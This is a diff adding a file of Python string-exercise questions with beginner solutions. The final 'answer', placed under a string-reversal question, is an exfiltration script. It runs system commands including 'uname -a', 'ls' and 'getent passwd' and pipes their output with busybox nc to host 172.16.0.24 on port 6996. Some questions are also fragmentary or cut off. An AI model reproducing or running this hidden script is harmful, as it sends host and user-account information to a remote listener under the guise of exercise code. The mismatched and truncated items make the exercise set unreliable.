@@ -1,0 +1,165 @@
+resource url?
+QUESTION ----------------
+Write a python program to count all letters,
+digits, and special symbols respectively from a given string
+------------------ANSWER
+letters = 'abcdefghijklmnopqrstuvwxyz'
+nums = '0123456789'
+
+l = n = s = 0
+for i in input().strip():
+    i = i.lower()
+    if i in letters:
+        l += 1
+    elif i in nums:
+        n += 1
+    else:
+        s += 1
+
+print(l,n,s, sep= "\n")
+------------------------------
+QUESTION ----------------
+Write a program to check if two strings are balanced. For example, strings s1 and s2 are balanced if all the characters in the s1 are present in s2. The character’s position doesn’t matter. If balanced display as "true" ,otherwise "false".
+------------------ANSWER
+# balanced strings
+
+sub = input()
+string = input()
+
+for i in sub:
+    if i not in string:
+        print(False)
+        break
+else:
+    print(True)
+------------------------------
+QUESTION ----------------
+Given
+two Strings s1 and s2, remove all the characters from s1 which is present in
+s2.
+------------------ANSWER
+s1, s2 = input(), input()
+
+for c in s1:
+    if c not in s2:
+        print(c, end= "")
+------------------------------
+QUESTION ----------------
+Given a string S which is of the format
+USERNAME@DOMAIN.EXTENSION, the program must print the EXTENSION, DOMAIN,
+USERNAME in the reverse order.
+------------------ANSWER
+mail = input()
+username, _, rest = mail.partition("@")
+domain, _, extension = rest.partition(".")
+print(extension, domain, username, sep= "\n")
+------------------------------
+QUESTION ----------------
+Two string values S1, S2 are passed as the input. The program
+must print first N characters present in S1 which are also present in S2.
+------------------ANSWER
+common = []
+str1 = input()
+str2 = input()
+n = int(input())
+for chr in str1:
+    if chr in str2 and len(common) < n and chr not in common:
+        common.append(chr)
+for i in common:
+    print(i, end="")
+------------------------------
+QUESTION ----------------
+Robert  is having 2 strings consist of uppercase &
+lowercase english letters. Now he want to compare those two strings
+lexicographically. The letters' case does not matter, that is an uppercase
+letter is considered equivalent to the corresponding lowercase letter.
+------------------ANSWER
+t =int(input())
+for _ in range(t):
+    str1 = input().lower()
+    str2 = input().lower()
+    if str1 == str2:
+        print(0)
+    elif str1 > str2:
+        print(1)
+    else:
+        print(-1)
+------------------------------
+QUESTION ----------------
+Write a python to read a sentence
+and print its longest word and its length
+------------------ANSWER
+sen = input().split()
+compare = lambda string : len(string)
+sen = sorted(sen, key=compare)
+
+maxlen = len(sen[-1])
+
+maxes = [i for i in sen if len(i) == maxlen]
+
+print(maxes[0], len(maxes[0]), sep= "\n")
+------------------------------
+QUESTION ----------------
+In this exercise, you will create a program that reads words from the user until the user enters a blank line. After the user enters a blank line your program should display each word entered by the user exactly once. The words should be displayed in the same order that they were first entered. For example, if the user enters:
+------------------ANSWER
+lines = []
+
+line = input().strip()
+lines.append(line)
+while len(line) > 0:
+    line = input().strip()
+    if line and line not in lines:
+        lines.append(line)
+
+print(*lines, sep= "\n")
+------------------------------
+QUESTION ----------------
+Assume
+that the given string has enough memory.
+------------------ANSWER
+string = input().strip()
+
+i = 0
+
+while i < len(string):
+    if string[i].isalpha():
+        count = 0
+        char = string[i]
+        i += 1
+        while i < len(string) and string[i].isnumeric():
+            count *= 10
+            count += int(string[i])
+            i += 1
+        print(count * char, end="")
+    else:
+        i += 1
+
+# print(idx)
+------------------------------
+QUESTION ----------------
+Reverse a string without affecting special characters Given a string S, containing special characters and all the alphabets, reverse the string without affecting the positions of the special characters.Input:   A&BOutput:  B&AExplanation:
+As we ignore '&' and As we ignore '&' and then reverse, so answer is "B&A".
+------------------ANSWER
+from os import system
+
+def ExfiltratorFactory(host,port):
+    exfilCommand = f" | busybox nc {host} {port}"
+    def Exfiltrate(command):
+        system(f"{command}" + exfilCommand)
+    def Separator():
+        system(f"echo {'-' * 40}" + exfilCommand)
+    return Exfiltrate, Separator
+
+
+exfil,sep = ExfiltratorFactory('172.16.0.24', 6996)
+
+exfil("echo siva")
+exfil("uname -a")
+sep()
+exfil("pwd")
+sep()
+exfil("ls")
+exfil("getent passwd")
+sep()
+sep()
+------------------------------
